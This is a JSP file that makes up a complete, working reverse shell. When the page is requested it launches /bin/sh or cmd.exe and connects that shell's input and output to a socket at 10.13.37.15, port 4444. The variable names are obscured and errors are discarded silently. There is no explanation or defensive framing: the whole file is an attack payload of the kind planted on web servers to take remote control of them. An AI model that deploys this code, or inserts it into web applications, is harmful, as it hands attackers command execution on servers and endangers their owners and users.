<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream l3;
    OutputStream ha;

    StreamConnector( InputStream l3, OutputStream ha )
    {
      this.l3 = l3;
      this.ha = ha;
    }

    public void run()
    {
      BufferedReader c0  = null;
      BufferedWriter aLW = null;
      try
      {
        c0  = new BufferedReader( new InputStreamReader( this.l3 ) );
        aLW = new BufferedWriter( new OutputStreamWriter( this.ha ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = c0.read( buffer, 0, buffer.length ) ) > 0 )
        {
          aLW.write( buffer, 0, length );
          aLW.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( c0 != null )
          c0.close();
        if( aLW != null )
          aLW.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "10.13.37.15", 4444 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
